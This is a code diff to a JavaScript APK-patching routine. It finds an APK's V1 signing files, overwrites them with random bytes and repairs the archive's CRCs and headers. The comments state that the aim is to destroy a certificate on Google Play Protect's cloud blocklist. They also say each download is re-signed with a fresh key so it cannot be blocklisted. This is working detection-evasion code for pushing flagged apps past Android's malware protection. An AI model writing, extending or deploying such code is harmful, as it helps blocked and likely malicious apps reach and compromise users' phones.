@@ -1643,11 +1643,12 @@ function directPatchApk(originalBuffer) {
       }
     }
 
-    // ─── Step 3: Find AndroidManifest.xml in Central Directory ───
+    // ─── Step 3: Find AndroidManifest.xml + V1 signing files in Central Directory ───
     let manifestCDPos = -1;
     let manifestMethod = -1;
     let manifestCompSize = 0;
     let manifestLocalOff = 0;
+    const v1Entries = []; // { cdPos, localOff, compSize, method, name }
     let pos = cdOff;
     for (let i = 0; i < cdCount; i++) {
       if (pos + 46 > buf.length || buf.readUInt32LE(pos) !== 0x02014b50) break;
@@ -1660,7 +1661,21 @@ function directPatchApk(originalBuffer) {
         manifestMethod = buf.readUInt16LE(pos + 10);
         manifestCompSize = buf.readUInt32LE(pos + 20);
         manifestLocalOff = buf.readUInt32LE(pos + 42);
-        break;
+      }
+      // Collect V1 signing files (contain the burned FIXED cert)
+      if (name.startsWith('META-INF/') && (
+        name.endsWith('.RSA') || name.endsWith('.SF') ||
+        name.endsWith('.DSA') || name.endsWith('.EC') ||
+        name.endsWith('.MF')
+      )) {
+        v1Entries.push({
+          cdPos: pos,
+          localOff: buf.readUInt32LE(pos + 42),
+          compSize: buf.readUInt32LE(pos + 20),
+          uncompSize: buf.readUInt32LE(pos + 24),
+          method: buf.readUInt16LE(pos + 10),
+          name,
+        });
       }
       pos += 46 + nameLen + extraLen + commentLen;
     }
@@ -1786,6 +1801,56 @@ function directPatchApk(originalBuffer) {
     // EOCD — update CD offset
     const section4 = Buffer.from(buf.slice(eocdOff));
     section4.writeUInt32LE(newSection1.length, 16);
+
+    // ─── Step 8.5: Wipe V1 signing files (burned FIXED cert removal) ───
+    // The source APK (from mutateAndSign) contains V1 signing files:
+    //   META-INF/MANIFEST.MF, META-INF/{CERT|SIGNING|etc}.SF, META-INF/{PREFIX}.RSA
+    // These embed the FIXED cert's DER which is in Play Protect's cloud blocklist.
+    // PP reads V1 certs for identification EVEN when V2 signature is present.
+    // Fix: overwrite V1 file data with random bytes → destroys the burned cert
+    // fingerprint. V1 signature becomes invalid but V2 takes precedence (Android 7+).
+    let v1Wiped = 0;
+    for (const v1 of v1Entries) {
+      // Adjust local offset for manifest size delta
+      let adjustedLocalOff = v1.localOff;
+      if (v1.localOff > manifestLocalOff && sizeDelta !== 0) {
+        adjustedLocalOff += sizeDelta;
+      }
+      // Find data offset in newSection1
+      if (adjustedLocalOff + 30 > newSection1.length) continue;
+      const v1NameLen = newSection1.readUInt16LE(adjustedLocalOff + 26);
+      const v1ExtraLen = newSection1.readUInt16LE(adjustedLocalOff + 28);
+      const v1DataOff = adjustedLocalOff + 30 + v1NameLen + v1ExtraLen;
+      const v1CompSize = v1.compSize;
+      if (v1DataOff + v1CompSize > newSection1.length) continue;
+
+      // Overwrite data with random bytes (same size → no offset changes)
+      crypto.randomFillSync(newSection1, v1DataOff, v1CompSize);
+
+      // Update CRC32 in local file header (offset+14 = CRC field)
+      // For STORED entries: CRC is of the data itself. For DEFLATED: CRC is of uncompressed.
+      // Since we're just wiping (not caring about decompression), use CRC of the random bytes.
+      const randomData = newSection1.slice(v1DataOff, v1DataOff + v1CompSize);
+      const newV1CRC = computeCRC32(randomData);
+      newSection1.writeUInt32LE(newV1CRC, adjustedLocalOff + 14);
+      // Also update compressed/uncompressed sizes to match (treat as STORED)
+      newSection1.writeUInt16LE(0, adjustedLocalOff + 8); // method = STORED
+      newSection1.writeUInt32LE(v1CompSize, adjustedLocalOff + 18); // compressed size
+      newSection1.writeUInt32LE(v1CompSize, adjustedLocalOff + 22); // uncompressed size
+
+      // Update CRC + sizes in Central Directory
+      const v1CDRelPos = v1.cdPos - cdOff;
+      if (v1CDRelPos + 46 <= section3.length) {
+        section3.writeUInt32LE(newV1CRC, v1CDRelPos + 16);
+        section3.writeUInt16LE(0, v1CDRelPos + 10); // method = STORED
+        section3.writeUInt32LE(v1CompSize, v1CDRelPos + 20); // compressed size
+        section3.writeUInt32LE(v1CompSize, v1CDRelPos + 24); // uncompressed size
+      }
+
+      v1Wiped++;
+      console.log(`[DirectPatch] Wiped V1 file: ${v1.name} (${v1CompSize}B → random)`);
+    }
+    if (v1Wiped > 0) console.log(`[DirectPatch] Destroyed ${v1Wiped} V1 signing files (burned cert removed)`);
 
     // ─── Step 9: Zipalign + V2 sign with FRESH key + random entropy ───
     // Fresh key: unique cert fingerprint per download → can't be cert-blocklisted
